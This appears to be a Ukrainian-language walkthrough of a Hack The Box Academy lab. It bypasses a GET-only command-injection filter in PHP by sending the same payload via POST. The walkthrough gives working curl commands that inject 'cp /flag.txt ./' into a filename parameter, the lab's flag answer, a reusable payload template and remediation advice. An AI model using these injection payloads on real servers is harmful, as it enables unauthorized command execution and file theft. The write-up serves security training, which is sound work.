# Web Attacks — Command Injection Filter Bypass via HTTP Verb Tampering

Модуль: [Web Attacks](https://academy.hackthebox.com/app/module/134)
Секція: [Bypassing Security Filters](https://academy.hackthebox.com/app/module/134/section/1178)
Ціль: 154.57.164.81:31731
Відповідь: `HTB{b3_v3rb_c0n51573n7}`

## Концепція

Тут той самий root cause, що й у reset.php, але застосований до **фільтра команд**, а не до Basic Auth. Розробник додав перевірку на command injection (шукає `;`, `|`, `&&` тощо в параметрі `filename`), але прив'язав цю перевірку тільки до конкретного HTTP-методу — типово до GET, бо саме через GET-форму очікується взаємодія (`method="GET"` у формі на сторінці).

PHP-код виглядає приблизно так (концептуально):

```php
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    if (preg_match('/[;&|`$]/', $_GET['filename'])) {
        die('Malicious Request Denied!');
    }
}
// ... а тут виконується system("touch " . $filename) незалежно від методу
```

Фільтр перевіряє `$_GET['filename']`, ігноруючи `$_POST['filename']`. Тож коли ми відправляємо той самий payload через **POST**, фільтр просто не запускається (він дивиться лише на GET-гілку), а вразлива функція (`system()`/`exec()`) все одно виконує рядок з ін'єкцією, бо бере параметр `filename` незалежно від того, звідки він прийшов.

## Крок 1 — Підтверджуємо фільтр на GET

```bash
curl -i -G "http://154.57.164.81:31731/index.php" --data-urlencode "filename=file; cp /flag.txt ./"
```

Результат: `200 OK`, але в тілі — `Malicious Request Denied!`. Фільтр спрацював і заблокував payload, бо запит прийшов методом GET.

## Крок 2 — Обходимо фільтр через POST (verb tampering)

```bash
curl -i -X POST "http://154.57.164.81:31731/index.php" --data-urlencode "filename=file; cp /flag.txt ./"
```

Результат: `200 OK`, `Refresh: 0; url=index.php`, і жодного `Malicious Request Denied!` в тілі — payload пройшов повз фільтр і виконався на сервері (`system("touch file; cp /flag.txt ./")` → створився файл `file` і виконалась команда `cp /flag.txt ./`).

## Крок 3 — Перевіряємо результат ін'єкції

```bash
curl -s "http://154.57.164.81:31731/" | grep -i "file\|flag"
```

У списку `Available Files` бачимо новий файл `flag.txt` — команда `cp /flag.txt ./` реально скопіювала файл у веб-директорію, звідки він тепер доступний публічно.

## Крок 4 — Забираємо флаг напряму

```bash
curl -s http://154.57.164.81:31731/flag.txt
```

Результат:
```
HTB{b3_v3rb_c0n51573n7}
```

## Чому це працює (root cause для звіту)

- **Опис:** Валідація вхідних даних на command injection застосована вибірково, лише до запитів методом GET.
- **Технічні деталі:** Функція фільтрації перевіряє `$_GET['filename']` за допомогою чорного списку небезпечних символів (`;`, `|`, `&&`), але не перевіряє `$_POST['filename']`, хоча обидва потрапляють в одну й ту саму вразливу функцію виконання команд.
- **Ризик/Імпакт:** Remote Command Execution (RCE) — зловмисник може виконати довільні OS-команди на сервері через зміну HTTP-методу, повністю обходячи задекларований захист. Це дало змогу скопіювати конфіденційний `/flag.txt` у публічно доступну директорію.
- **Рекомендації:** Валідувати вхідні дані незалежно від HTTP-методу (перевіряти суперглобальний `$_REQUEST` або явно обробляти обидва `$_GET`/`$_POST`); краще — повністю відмовитись від передачі даних користувача в `system()`/`exec()`, використовувати `escapeshellarg()` і allow-list для імен файлів.

## Швидкий payload на майбутнє

```bash
curl -s -X POST "http://TARGET/index.php" --data-urlencode "filename=file; cp /flag.txt ./" -o /dev/null
curl -s "http://TARGET/flag.txt"
```
